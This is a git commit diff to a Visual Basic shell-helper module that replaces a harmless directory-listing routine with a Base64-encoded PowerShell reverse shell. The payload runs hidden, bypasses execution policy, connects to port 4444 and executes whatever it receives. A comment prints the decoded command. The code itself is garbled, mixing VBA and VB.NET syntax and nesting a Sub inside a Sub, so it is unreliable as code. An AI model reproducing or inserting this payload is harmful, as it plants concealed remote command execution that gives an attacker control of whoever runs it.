22b9c354410c5644e13cb4dcd0c64f95f553ba7a
el-mo9awin1954dz <118679598+el-mo9awin1954dz@users.noreply.github.com>
2023-04-21 02:14:10 +0100

    Update VBSHELL.vb

--- VBSHELL.vb
+++ VBSHELL.vb
@@ -1,3 +1,7 @@
+
+Imports System
+Imports System.Text
+
 Attribute VB_Name = "mdlShellAndWait"
 Option Explicit
 
@@ -71,6 +75,24 @@ HandleError:
     ShellAndWait = False
 End Function
 
-Sub SpawnDir()
-   ShellAndWait("dir", 10)
-End Sub
+Namespace Base64code.Decode
+    Public Class Base64Sample
+        Public Shared Sub Main()
+            Dim strB64Encoded As String = "cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCIxMjcuMC4wLjEiLDQ0NDQpOyRzPSRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYj0wLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzLlJlYWQoJGIsIDAsICRiLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRiLDAsICRpKTskc2IgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNiMj0kc2IrIlBTICIrKHB3ZCkuUGF0aCsiPiAiOyRzYnQgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNiMik7JHMuV3JpdGUoJHNidCwwLCRzYnQuTGVuZ3RoKTskcy5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk="
+            Dim data As Byte() = Convert.FromBase64String(strB64Encoded)
+            Dim strB64Decoded As String = UTF8Encoding.GetString(data)
+        '   Console.WriteLine(strB64Decoded) >> 
+        '   powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("127.0.0.1",4444);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()
+        '    Dim strB64Decoded As String = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("127.0.0.1",4444);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+        '    Dim data As Byte() = UTF8Encoding.GetBytes(strB64Decoded)
+            ' convert the byte array to a Base64 string
+        '    Dim strB64Encoded As String = Convert.ToBase64String(data)
+            Console.WriteLine(strB64Encoded)
+            Sub SpawnDir()
+                ShellAndWait(strB64Encoded, 10)
+            End Sub
+        End Sub
+    End Class
+End Namespace
+                
+
